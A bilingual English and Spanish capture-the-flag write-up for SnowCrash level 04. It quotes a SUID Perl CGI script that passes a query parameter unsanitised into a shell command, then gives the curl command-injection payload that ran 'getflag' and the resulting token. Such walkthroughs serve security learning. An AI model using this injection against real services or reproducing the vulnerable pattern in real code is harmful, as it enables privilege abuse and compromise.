# Flag 04

## Tools Used:

* `ls` command
* `curl`
* Basic understanding of CGI scripting and command injection

## Process:

Upon accessing the `level04` account, listing the files reveals an executable Perl script:

```bash
level04@SnowCrash:~$ ls -la
```

Key file:

```
-rwsr-sr-x 1 flag04  level04  152 Mar  5  2016 level04.pl
```

The presence of the **SUID** bit means this script will run with `flag04`’s privileges.

Inspecting the script:

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

### Key observations:

1. The script is a **CGI** script running on **localhost:4747**.
2. The value of the `x` parameter in the query string is passed to an `echo` command without sanitization.

### Exploitation:

We can inject a command by using shell expansion inside the parameter. The following command uses `curl` to send the malicious query:

```bash
level04@SnowCrash:~$ curl localhost:4747?x='"$(getflag)"'
```

The response reveals the flag:

```
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

---

# Flag 04

## Herramientas Utilizadas:

* Comando `ls`
* `curl`
* Conocimientos básicos de CGI y de inyección de comandos

## Proceso:

Al acceder a la cuenta `level04`, al listar los archivos se encuentra un script Perl ejecutable:

```bash
level04@SnowCrash:~$ ls -la
```

Archivo clave:

```
-rwsr-sr-x 1 flag04  level04  152 Mar  5  2016 level04.pl
```

La presencia del bit **SUID** significa que este script se ejecuta con los privilegios de `flag04`.

Inspeccionando el código:

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

### Observaciones clave:

1. El script es un **CGI** que corre en **localhost:4747**.
2. El valor del parámetro `x` se pasa directamente a un comando `echo` sin validación.

### Explotación:

Podemos inyectar un comando usando expansión de shell dentro del parámetro. El siguiente comando envía la petición maliciosa:

```bash
level04@SnowCrash:~$ curl localhost:4747?x='"$(getflag)"'
```

La respuesta nos devuelve la flag:

```
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

---

## Scripts Used:

None

## Flag:

```
ne2searoevaevoem4ov4ar8ap
```
